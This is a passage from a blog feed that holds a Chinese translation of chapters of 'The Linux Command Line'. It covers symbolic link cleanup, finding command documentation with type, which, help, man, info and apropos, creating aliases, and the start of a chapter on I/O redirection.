<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l</span><br><span class="line">total 8</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir1</span><br><span class="line">lrwxrwxrwx 1 me  me   4 2018-01-16 14:45 dir1-sym -&gt; dir1</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir2</span><br><span class="line">lrwxrwxrwx 1 me  me   3 2018-01-15 15:15 fun-sym -&gt; fun</span><br></pre></td></tr></table></figure>

<p>大多数 Linux 发行版都配置 <code>ls</code> 以显示破损的链接。破损链接的存在本身并不危险，但相当凌乱。如果我们尝试使用破损的链接，我们将看到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ less fun-sym</span><br><span class="line">fun-sym: No such file or directory</span><br></pre></td></tr></table></figure>

<p>让我们进行一些清理。我们将删除这里的符号链接：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">rm</span> fun-sym dir1-sym</span><br><span class="line">[me@linuxbox playground]$ <span class="built_in">ls</span> -l</span><br><span class="line">total 8</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir1</span><br><span class="line">drwxrwxr-x 2 me  me  4096 2018-01-15 15:17 dir2</span><br></pre></td></tr></table></figure>

<p>关于符号链接的一点要记住的是，大多数文件操作是在链接的目标上执行的，而不是链接本身。<code>rm</code> 是一个例外。当我们删除一个链接时，删除的是链接本身，而不是目标。</p>
<p>最后，我们将删除我们的练习空间。为此，我们将返回到我们的主目录，并使用带有递归选项（<code>-r</code>）的 <code>rm</code> 来删除 <code>playground</code> 及其所有内容，包括其子目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox playground]$ <span class="built_in">cd</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">rm</span> -r playground</span><br></pre></td></tr></table></figure>

<h3 id="使用图形用户界面创建符号链接"><a href="#使用图形用户界面创建符号链接" class="headerlink" title="使用图形用户界面创建符号链接"></a>使用图形用户界面创建符号链接</h3><p>无论是 GNOME 还是 KDE 中的文件管理器，它们都提供了一种简单而自动的方法来创建符号链接。在 GNOME 中，按住 Ctrl+Shift 键并拖动文件将创建链接，而不是复制（或移动）文件。在 KDE 中，当文件被拖放时，会出现一个小菜单，提供复制、移动或链接文件的选择。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们在这里涵盖了很多内容，需要一段时间才能完全理解。反复进行操场练习，直到理解为止。深入了解基本文件操作命令和通配符是很重要的。请随意通过添加更多文件和目录，使用通配符指定文件进行各种操作，扩展操场练习。符号链接的概念一开始可能有点令人困惑，但请花时间学习它们的工作原理。它们可以真正帮助你解决问题。</p>
<p><strong>进一步阅读</strong></p>
<ul>
<li>有关符号链接的讨论：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TeW1ib2xpY19saW5r">Symbolic link - Wikipedia<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>使用命令</title>
    <url>/2024/03/5-working-with-commands/</url>
    <content><![CDATA[<h2 id="5-–-使用命令"><a href="#5-–-使用命令" class="headerlink" title="5 – 使用命令"></a>5 – 使用命令</h2><p>到目前为止，我们已经看到了一系列神秘的命令，每个命令都有其自己神秘的选项和参数。在这一章中，我们将尝试消除其中的一些神秘感，甚至创建我们自己的命令。本章介绍的命令包括：</p>
<ul>
<li>type – 指示如何解释命令名称</li>
<li>which – 显示将要执行的可执行程序</li>
<li>help – 获取shell内建命令的帮助</li>
<li>man – 显示命令的手册页</li>
<li>apropos – 显示适当命令的列表</li>
<li>info – 显示命令的信息条目</li>
<li>whatis – 显示一行手册页描述</li>
<li>alias – 为命令创建一个别名</li>
</ul>
<span id="more"></span>

<p><strong>命令到底是什么？</strong></p>
<p>命令可以是以下四种不同的东西：</p>
<ol>
<li><strong>一个可执行程序</strong>，就像我们在 &#x2F;usr&#x2F;bin 中看到的所有文件。在这个类别内，程序可以是<em>编译的二进制文件</em>，例如用C和C++编写的程序，或者是用<em>脚本语言</em>（如shell、Perl、Python、Ruby等）编写的程序。</li>
<li><strong>内建于shell本身的命令</strong>。bash支持许多内部称为<em>shell内建命令</em>的命令。例如，cd命令就是一个shell内建命令。</li>
<li><strong>一个shell函数</strong>。shell函数是嵌入到<em>环境</em>中的迷你shell脚本。我们将在后面的章节中讨论配置环境和编写shell函数，但现在只需知道它们存在即可。</li>
<li><strong>一个别名</strong>。别名是我们自己可以定义的命令，由其他命令构建而成。</li>
</ol>
<h3 id="识别命令"><a href="#识别命令" class="headerlink" title="识别命令"></a>识别命令</h3><p>知道正在使用哪种四种命令类型通常是有用的，Linux提供了几种方式来了解这一点。</p>
<h4 id="type-–-显示命令类型"><a href="#type-–-显示命令类型" class="headerlink" title="type – 显示命令类型"></a>type – 显示命令类型</h4><p>type命令是一个shell内建命令，给定一个特定的命令名称，它会显示shell将执行的命令类型。它的使用方式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">type command</span><br></pre></td></tr></table></figure>

<p>其中“命令”是我们想要检查的命令的名称。以下是一些示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ type type</span><br><span class="line">type is a shell builtin</span><br><span class="line">[me@linuxbox ~]$ type ls</span><br><span class="line">ls is aliased to `ls --color=tty&#x27;</span><br><span class="line">[me@linuxbox ~]$ type cp</span><br><span class="line">cp is /bin/cp</span><br></pre></td></tr></table></figure>

<p>在这里，我们看到了三个不同命令的结果。请注意，其中一个是ls（来自Fedora系统），以及ls命令实际上是带有“–color&#x3D;tty”选项的ls命令的别名。现在我们知道为什么ls的输出是彩色的了！</p>
<h4 id="which-–-显示可执行程序的位置"><a href="#which-–-显示可执行程序的位置" class="headerlink" title="which – 显示可执行程序的位置"></a>which – 显示可执行程序的位置</h4><p>有时，在系统上安装了一个可执行程序的多个版本。尽管这在桌面系统上不常见，但在大型服务器上并不少见。为了确定给定可执行程序的确切位置，可以使用which命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ which ls</span><br><span class="line">/bin/ls</span><br></pre></td></tr></table></figure>

<p>which仅适用于可执行程序，不适用于内建命令或用作实际可执行程序替代品的别名。例如，当我们尝试在shell内建命令（如cd）上使用which时，要么没有响应，要么会收到错误消息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ which cd</span><br><span class="line">/usr/bin/which: no cd in (/usr/local/bin:/usr/bin:/bin:/usr/local</span><br><span class="line">/games:/usr/games)</span><br></pre></td></tr></table></figure>

<p>这个响应实际上是在说“命令未找到。”</p>
<h3 id="获取命令文档"><a href="#获取命令文档" class="headerlink" title="获取命令文档"></a>获取命令文档</h3><p>有了对命令的这些了解，我们现在可以搜索每种命令可用的文档。</p>
<h4 id="help-–-获取shell内建命令的帮助"><a href="#help-–-获取shell内建命令的帮助" class="headerlink" title="help – 获取shell内建命令的帮助"></a>help – 获取shell内建命令的帮助</h4><p>bash为每个shell内建命令提供了一个内建的帮助工具。要使用它，输入“help”后跟shell内建命令的名称。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ help cd</span><br><span class="line">cd: cd [-L|[-P [-e]] [-@]] [dir]</span><br><span class="line"> Change the shell working directory.</span><br><span class="line"> Change the current directory to DIR. The default DIR is the</span><br><span class="line"> value of the HOME shell variable.</span><br><span class="line"> The variable CDPATH defines the search path for the directory</span><br><span class="line"> containing DIR. Alternative directory names in CDPATH are</span><br><span class="line"> separated by a colon (:). A null directory name is the same as</span><br><span class="line"> the current directory. If DIR begins with a slash (/), then</span><br><span class="line"> CDPATH is not used.</span><br><span class="line"> If the directory is not found, and the shell option `cdable_vars&#x27;</span><br><span class="line"> is set, the word is assumed to be a variable name. If that</span><br><span class="line"> variable has a value, its value is used for DIR.</span><br><span class="line"> Options:</span><br><span class="line"> -L force symbolic links to be followed: resolve symbolic</span><br><span class="line"> links in DIR after processing instances of `..&#x27;</span><br><span class="line"> -P use the physical directory structure without following</span><br><span class="line"> symbolic links: resolve symbolic links in DIR before</span><br><span class="line"> processing instances of `..&#x27;</span><br><span class="line"> -e if the -P option is supplied, and the current working</span><br><span class="line"> directory cannot be determined successfully, exit with</span><br><span class="line"> a non-zero status</span><br><span class="line"> -@ on systems that support it, present a file with extended</span><br><span class="line"> attributes as a directory containing the file attributes</span><br><span class="line"> The default is to follow symbolic links, as if `-L&#x27; were</span><br><span class="line"> specified. `..&#x27; is processed by removing the immediately previous</span><br><span class="line"> pathname component back to a slash or the beginning of DIR.</span><br><span class="line"> Exit Status:</span><br><span class="line"> Returns 0 if the directory is changed, and if $PWD is set</span><br><span class="line"> successfully when -P is used; non-zero otherwise.</span><br></pre></td></tr></table></figure>

<p><strong>关于符号表示法的说明：</strong> 当命令语法描述中出现方括号时，它们表示可选项。竖线字符表示互斥的选项。以上面的cd命令为例：</p>
<p>cd [-L|[-P[-e]]] [dir]</p>
<p>这个表示法表示cd命令后面可以选择加上“-L”或“-P”，如果指定了“-P”选项，还可以加上可选的“-e”选项，后跟可选的参数“dir”。</p>
<p>虽然cd命令的帮助输出简洁准确，但它绝不是教程，而且如我们所见，它似乎还提到了许多我们尚未讨论的内容！不用担心，我们会慢慢了解的。</p>
<h4 id="–help-–-显示使用信息"><a href="#–help-–-显示使用信息" class="headerlink" title="–help – 显示使用信息"></a>–help – 显示使用信息</h4><p>许多可执行程序支持“–help”选项，该选项显示命令支持的语法和选项的描述。例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ mkdir --help</span><br><span class="line">Usage: mkdir [OPTION] DIRECTORY...</span><br><span class="line">Create the DIRECTORY(ies), if they do not already exist.</span><br><span class="line"> -Z, --context=CONTEXT (SELinux) set security context to CONTEXT</span><br><span class="line">Mandatory arguments to long options are mandatory for short options</span><br><span class="line">too.</span><br><span class="line"> -m, --mode=MODE set file mode (as in chmod), not a=rwx – umask</span><br><span class="line"> -p, --parents no error if existing, make parent directories as</span><br><span class="line"> needed</span><br><span class="line"> -v, --verbose print a message for each created directory</span><br><span class="line"> --help display this help and exit</span><br><span class="line"> --version output version information and exit</span><br><span class="line">Report bugs to &lt;bug-coreutils@gnu.org&gt;.</span><br></pre></td></tr></table></figure>

<p>有些程序不支持“–help”选项，但还是试一试。通常会出现一个错误消息，该消息会显示相同的使用信息。</p>
<h4 id="man-–-显示程序的手册页"><a href="#man-–-显示程序的手册页" class="headerlink" title="man – 显示程序的手册页"></a>man – 显示程序的手册页</h4><p>大多数用于命令行的可执行程序都提供一份正式的文档，称为<em>手册</em>或<em>man页面</em>。我们使用一个名为man的特殊分页程序来查看它们。使用方法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">man program</span><br></pre></td></tr></table></figure>

<p>其中，“程序名”是您要查看的命令的名称。</p>
<p>man页面在格式上有所不同，但通常包含以下内容：</p>
<ul>
<li>标题（页面的名称）</li>
<li>命令语法的概要</li>
<li>命令目的的描述</li>
<li>命令选项的列表和描述</li>
</ul>
<p>然而，man页面通常不包括示例，并且旨在作为参考，而不是教程。例如，让我们尝试查看ls命令的man页面：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ man ls</span><br></pre></td></tr></table></figure>

<p>在大多数Linux系统上，man使用less来显示手册页，因此在显示页面时，所有熟悉的less命令都可以使用。</p>
<p>man显示的“手册”被分为几个部分，不仅涵盖用户命令，还包括系统管理命令、编程接口、文件格式等等。表5-1描述了手册的布局。</p>
<p><em>表5-1：Man页面组织</em></p>
<table>
<thead>
<tr>
<th><strong>章节</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>用户命令</td>
</tr>
<tr>
<td>2</td>
<td>内核系统调用的编程接口</td>
</tr>
<tr>
<td>3</td>
<td>C库的编程接口</td>
</tr>
<tr>
<td>4</td>
<td>特殊文件，如设备节点和驱动程序</td>
</tr>
<tr>
<td>5</td>
<td>文件格式</td>
</tr>
<tr>
<td>6</td>
<td>游戏和娱乐，如屏幕保护程序</td>
</tr>
<tr>
<td>7</td>
<td>杂项</td>
</tr>
<tr>
<td>8</td>
<td>系统管理命令</td>
</tr>
</tbody></table>
<p>有时，我们需要引用手册的特定章节以找到我们正在寻找的内容。这在我们正在寻找一个既是命令名称又是文件格式的内容时尤其如此。如果不指定章节号，我们总是会得到匹配项的第一个实例，可能在第1章节中。要指定章节号，我们可以这样使用man：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">man section search_term</span><br></pre></td></tr></table></figure>

<p>这里有一个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ man 5 passwd</span><br></pre></td></tr></table></figure>

<p>这将显示描述<code>/etc/passwd</code>文件的文件格式的man页面。</p>
<h4 id="apropos-–-显示适当的命令"><a href="#apropos-–-显示适当的命令" class="headerlink" title="apropos – 显示适当的命令"></a>apropos – 显示适当的命令</h4><p>还可以根据搜索词在man页面列表中搜索可能的匹配项。这种方法虽然简单，但有时很有帮助。以下是使用搜索词<em>partition</em>搜索man页面的示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ apropos partiton</span><br><span class="line">addpart (8) - simple wrapper around the &quot;add partition&quot;...</span><br><span class="line">all-swaps (7) - event signalling that all swap partitions...</span><br><span class="line">cfdisk (8) - display or manipulate disk partition table</span><br><span class="line">cgdisk (8) - Curses-based GUID partition table (GPT)...</span><br><span class="line">delpart (8) - simple wrapper around the &quot;del partition&quot;...</span><br><span class="line">fdisk (8) - manipulate disk partition table</span><br><span class="line">fixparts (8) - MBR partition table repair utility </span><br><span class="line">gdisk (8) - Interactive GUID partition table (GPT)...</span><br><span class="line">mpartition (1) - partition an MSDOS hard disk</span><br><span class="line">partprobe (8) - inform the OS of partition table changes</span><br><span class="line">partx (8) - tell the Linux kernel about the presence...</span><br><span class="line">resizepart (8) - simple wrapper around the &quot;resize partition...</span><br><span class="line">sfdisk (8) - partition table manipulator for Linux</span><br><span class="line">sgdisk (8) - Command-line GUID partition table (GPT)... </span><br></pre></td></tr></table></figure>

<p>输出每行的第一个字段是man页面的名称，第二个字段显示其所在的章节。请注意，带有“-k”选项的man命令执行与<code>apropos</code>相同的功能。</p>
<h4 id="whatis-–-显示一行的手册页描述"><a href="#whatis-–-显示一行的手册页描述" class="headerlink" title="whatis – 显示一行的手册页描述"></a>whatis – 显示一行的手册页描述</h4><p><code>whatis</code>程序显示与指定关键字匹配的man页面的名称和一行描述：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ whatis ls</span><br><span class="line">ls (1) - list directory contents</span><br></pre></td></tr></table></figure>

<h3 id="最残酷的所有Man页面"><a href="#最残酷的所有Man页面" class="headerlink" title="最残酷的所有Man页面"></a>最残酷的所有Man页面</h3><p>正如我们所见，供Linux和其他类Unix系统使用的手册页面是作为参考文档提供的，而不是教程。许多man页面很难阅读，但我认为最难的要属于bash的man页面。在为这本书进行研究时，我仔细审查了bash的man页面，以确保我覆盖了其中的大部分主题。打印出来的页面超过80页，内容极为密集，对于新用户来说，其结构完全没有意义。</p>
<p>另一方面，它非常准确和简洁，同时也非常完整。所以，如果你敢于尝试，可以查看一下，并期待有一天你能够理解它的所有内容。</p>
<h4 id="info-–-显示程序的Info条目"><a href="#info-–-显示程序的Info条目" class="headerlink" title="info – 显示程序的Info条目"></a>info – 显示程序的Info条目</h4><p>GNU项目为其程序提供了一个替代man页面的选项，称为“info”。Info手册使用一个名为<code>info</code>的阅读程序显示，非常贴切地命名。Info页面像网页一样有<em>超链接</em>。以下是一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">File: coreutils.info, Node: ls invocation, Next: dir invocation,</span><br><span class="line">Up: Directory listing</span><br><span class="line">10.1 `ls&#x27;: List directory contents</span><br><span class="line">==================================</span><br><span class="line">The `ls&#x27; program lists information about files (of any type,</span><br><span class="line">including directories). Options and file arguments can be intermixed</span><br><span class="line">arbitrarily, as usual.</span><br><span class="line"> For non-option command-line arguments that are directories, by</span><br><span class="line">default `ls&#x27; lists the contents of directories, not recursively, and</span><br><span class="line">omitting files with names beginning with `.&#x27;. For other non-option</span><br><span class="line">arguments, by default `ls&#x27; lists just the filename. If no non-option</span><br><span class="line">argument is specified, `ls&#x27; operates on the current directory, acting</span><br><span class="line">as if it had been invoked with a single argument of `.&#x27;.</span><br><span class="line"> By default, the output is sorted alphabetically, according to the</span><br><span class="line">--zz-Info: (coreutils.info.gz)ls invocation, 63 lines --Top----------</span><br></pre></td></tr></table></figure>

<p>info程序读取<em>info文件</em>，这些文件按树形结构划分为单独的<em>节点</em>，每个节点包含一个主题。Info文件包含可以将读者从一个节点移动到另一个节点的超链接。超链接可以通过其前导星号来识别，并通过将光标放在其上并按Enter键来激活它。</p>
<p>要调用info，可以输入<code>info</code>，后面可以选择性地跟上程序的名称。表5-2描述了在显示info页面时用于控制阅读器的命令。</p>
<p><em>表 5-2：</em> <em>info命令</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>?</td>
<td>显示命令帮助</td>
</tr>
<tr>
<td>PgUp或Backspace</td>
<td>显示上一页</td>
</tr>
<tr>
<td>PgDn或Space</td>
<td>显示下一页</td>
</tr>
<tr>
<td>n</td>
<td>下一个 - 显示下一个节点</td>
</tr>
<tr>
<td>p</td>
<td>上一个 - 显示前一个节点</td>
</tr>
<tr>
<td>u</td>
<td>上 - 显示当前显示节点的父节点，通常是一个菜单</td>
</tr>
<tr>
<td>Enter</td>
<td>在光标位置跟随超链接</td>
</tr>
<tr>
<td>｜q</td>
<td>退出</td>
</tr>
</tbody></table>
<p>到目前为止，我们讨论的大多数命令行程序都是GNU项目的<em>coreutils</em>包的一部分，因此输入以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ info coreutils</span><br></pre></td></tr></table></figure>

<p>会显示一个菜单页面，其中包含到coreutils包中每个程序的超链接。</p>
<h4 id="README和其他程序文档文件"><a href="#README和其他程序文档文件" class="headerlink" title="README和其他程序文档文件"></a>README和其他程序文档文件</h4><p>我们系统上安装的许多软件包都有文档文件存放在<code>/usr/share/doc</code>目录中。其中大多数以纯文本格式存储，并可以使用<code>less</code>查看。其中一些文件以HTML格式存储，并可使用Web浏览器查看。我们可能会遇到一些以“.gz”扩展名结尾的文件。这表示它们已使用gzip压缩程序进行了压缩。gzip包包括一个名为<code>zless</code>的特殊版本的<code>less</code>，它将显示gzip压缩的文本文件的内容。</p>
<h3 id="使用alias创建自己的命令"><a href="#使用alias创建自己的命令" class="headerlink" title="使用alias创建自己的命令"></a>使用alias创建自己的命令</h3><p>现在，我们将进行第一次编程体验！我们将使用<code>alias</code>命令创建自己的命令。但在开始之前，我们需要揭示一个小的命令行技巧。通过使用分号将每个命令分隔开，可以在一行上放置多个命令。它的工作方式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">command1; command2; command3...</span><br></pre></td></tr></table></figure>

<p>下面是我们要使用的示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ cd /usr; ls; cd -</span><br><span class="line">bin games include lib local sbin share src</span><br><span class="line">/home/me</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>如我们所见，我们在一行上组合了三个命令。首先，我们更改目录到<code>/usr</code>，然后列出该目录，最后返回到原始目录（通过使用<code>cd -</code>），这样我们最终回到了起始位置。现在，让我们使用<code>alias</code>将这个序列转化为一个新命令。首先，我们需要为新命令想一个名字。让我们尝试使用“test”。在这样做之前，了解“test”这个名称是否已经被使用是一个好主意。为了了解这一点，我们可以再次使用<code>type</code>命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ type test</span><br><span class="line">test is a shell builtin</span><br></pre></td></tr></table></figure>

<p>哎呀！名称测试已被占用。让我们试试 foo：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ type foo</span><br><span class="line">bash: type: foo: not found</span><br></pre></td></tr></table></figure>

<p>太好了 “foo “没有被使用。因此，让我们创建别名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ alias foo=&#x27;cd /usr; ls; cd -&#x27;</span><br></pre></td></tr></table></figure>

<p>请注意此处显示的命令结构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias name=&#x27;string&#x27;</span><br></pre></td></tr></table></figure>

<p>在别名命令之后，我们要给别名一个名称，紧接着（不允许使用空格不允许使用空格），紧接着是一个等号，然后是一个带引号的字符串，其中包含赋予该名称的含义。定义别名后，我们可以在 shell希望使用命令的地方。让我们试试看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo</span><br><span class="line">bin games include lib local sbin share src</span><br><span class="line">/home/me</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>我们还可以再次使用 type 命令查看别名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ type foo</span><br><span class="line">foo is aliased to `cd /usr; ls; cd -&#x27;</span><br></pre></td></tr></table></figure>

<p>要删除别名，可以使用 unalias 命令，如图所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ unalias foo</span><br><span class="line">[me@linuxbox ~]$ type foo</span><br><span class="line">bash: type: foo: not found</span><br></pre></td></tr></table></figure>

<p>虽然我们有意避免使用现有命令名称来命名别名，但这种做法并不罕见。这样做并不罕见。这样做通常是为了在调用常用命令的每次调用一个常用命令时应用一个常用选项。例如，我们在前面已经看到 ls 命令是如何经常被别名以增加颜色支持：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ type ls</span><br><span class="line">ls is aliased to `ls --color=tty&#x27;</span><br></pre></td></tr></table></figure>

<p>要查看环境中定义的所有别名，请使用不带参数的别名命令。以下是 Fedora 系统默认定义的一些别名。试着找出它们都是做什么的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ alias</span><br><span class="line">alias l.=&#x27;ls -d .* --color=tty&#x27;</span><br><span class="line">alias ll=&#x27;ls -l --color=tty&#x27;</span><br><span class="line">alias ls=&#x27;ls --color=tty&#x27;</span><br></pre></td></tr></table></figure>

<p>在命令行中定义别名有一个小问题。当 shell 会话结束时，别名就会消失。在第 11 章 “环境 “中，我们将看到如何在每次登录时建立环境的文件中添加我们自己的别名，但现在，请享受我们在 shell 编程世界中迈出的第一步，尽管只是很小的一步！</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>现在我们已经学习了如何查找命令的文档，去查找到目前为止我们遇到的所有命令的文档。研究哪些额外的选项是可用的，并尝试它们！</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><p>有许多在线资源提供Linux和命令行的文档。以下是一些最佳资源：</p>
<ul>
<li><p><strong>Bash 参考手册</strong> 是bash shell的参考指南。它仍然是一个参考工作，但包含示例并且比bash的man页面更容易阅读。</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2Jhc2hyZWYuaHRtbA==">http://www.gnu.org/software/bash/manual/bashref.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><strong>Bash 常见问题解答</strong> 包含关于bash的常见问题的答案。这个列表针对中级到高级用户，但包含了大量的有用信息。</p>
<p><span class="exturl" data-url="aHR0cDovL215d2lraS53b29sZWRnZS5vcmcvQmFzaEZBUQ==">http://mywiki.wooledge.org/BashFAQ<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>GNU项目为其程序提供了广泛的文档，这些程序构成了Linux命令行体验的核心。您可以在这里看到完整的列表：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL21hbnVhbC9tYW51YWwuaHRtbA==">http://www.gnu.org/manual/manual.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>维基百科有一篇关于man页面的有趣文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NYW5fcGFnZQ==">http://en.wikipedia.org/wiki/Man_page<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>重定向</title>
    <url>/2024/03/6-redirection/</url>
    <content><![CDATA[<h2 id="6-–-重定向"><a href="#6-–-重定向" class="headerlink" title="6 – 重定向"></a>6 – 重定向</h2><p>在这一课中，我们将介绍命令行可能最酷炫的功能，那就是<strong>I&#x2F;O重定向</strong>。这里的“I&#x2F;O”代表<strong>输入&#x2F;输出</strong>，通过这个功能，我们可以将命令的输入和输出重定向到文件，并将多个命令连接成强大的命令<strong>管道</strong>。为了展示这一功能，我们将介绍以下命令：</p>
<ul>
<li>cat – 连接文件</li>
<li>sort – 对文本行进行排序</li>
<li>uniq – 报告或省略重复行</li>
<li>grep – 打印与模式匹配的行</li>
<li>wc – 打印每个文件的换行符、单词和字节计数</li>
<li>head – 输出文件的前部分</li>
<li>tail – 输出文件的后部分</li>
<li>tee – 从标准输入读取并写入标准输出和文件</li>
</ul>
<span id="more"></span>

<h3 id="标准输入、输出和错误"><a href="#标准输入、输出和错误" class="headerlink" title="标准输入、输出和错误"></a>标准输入、输出和错误</h3><p>到目前为止，我们使用的许多程序都会产生某种形式的输出。这些输出通常包括两种类型：</p>
<ul>
<li>程序的结果，也就是程序设计要产生的数据</li>
<li>状态和错误消息，告诉我们程序的执行情况</li>
</ul>
<p>如果我们查看像<code>ls</code>这样的命令，可以看到它在屏幕上显示其结果和错误消息。</p>
<p>遵循“一切都是文件”的Unix主题，像<code>ls</code>这样的程序实际上会将它们的结果发送到一个称为<strong>标准输出</strong>（通常表示为<strong>stdout</strong>）的特殊文件，而将它们的状态消息发送到另一个称为<strong>标准错误</strong>（<strong>stderr</strong>）的文件。默认情况下，标准输出和标准错误都链接到屏幕，而不保存到磁盘文件中。</p>
<p>此外，许多程序从一个称为<strong>标准输入</strong>（<strong>stdin</strong>）的设施中获取输入，默认情况下与键盘相连。</p>
<p>I&#x2F;O重定向允许我们改变输出的目的地和输入的来源。通常，输出会显示在屏幕上，输入来自键盘，但通过I&#x2F;O重定向，我们可以改变这一点。</p>
<h3 id="重定向标准输出"><a href="#重定向标准输出" class="headerlink" title="重定向标准输出"></a>重定向标准输出</h3><p>I&#x2F;O重定向允许我们重新定义标准输出的位置。要将标准输出重定向到另一个文件而不是屏幕，我们使用<code>&gt;</code>重定向操作符，后面跟着文件的名称。为什么我们要这么做呢？通常，将命令的输出存储在文件中是很有用的。例如，我们可以告诉shell将<code>ls</code>命令的输出发送到名为<code>ls-output.txt</code>的文件，而不是屏幕上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /usr/bin &gt; ls-output.txt</span><br></pre></td></tr></table></figure>

<p>在这里，我们创建了<code>/usr/bin</code>目录的长列表，并将结果发送到名为<code>ls-output.txt</code>的文件中。让我们检查这个命令的重定向输出，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l ls-output.txt</span><br><span class="line">-rw-rw-r-- 1 me me 167878 2018-02-01 15:07 ls-output.txt</span><br></pre></td></tr></table></figure>

<p>很好 — 一个很大的文本文件。如果我们用<code>less</code>查看这个文件，我们会看到<code>ls-output.txt</code>文件确实包含了我们<code>ls</code>命令的结果。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ less ls-output.txt</span><br></pre></td></tr></table></figure>

<p>现在，让我们重复我们的重定向测试，但这次有一个小变化。我们将更改目录的名称为一个不存在的名称：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l /bin/usr &gt; ls-output.txt</span><br><span class="line">ls: cannot access /bin/usr: No such file or directory</span><br></pre></td></tr></table></figure>

<p>我们收到了一个错误消息。这很有道理，因为我们指定了不存在的目录 <code>/bin/usr</code>，但为什么错误消息会显示在屏幕上，而不是被重定向到文件 <code>ls-output.txt</code> 呢？答案是 <code>ls</code> 程序并没有将其错误消息发送到标准输出。相反，像大多数编写良好的Unix程序一样，它将其错误消息发送到标准错误。因为我们只重定向了标准输出而没有重定向标准错误，所以错误消息仍然发送到了屏幕上。我们稍后将看到如何重定向标准错误，但首先让我们看看我们的输出文件发生了什么：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ls -l ls-output.txt</span><br><span class="line">-rw-rw-r-- 1 me me 0 2018-02-01 15:08 ls-output.txt</span><br></pre></td></tr></table></figure>

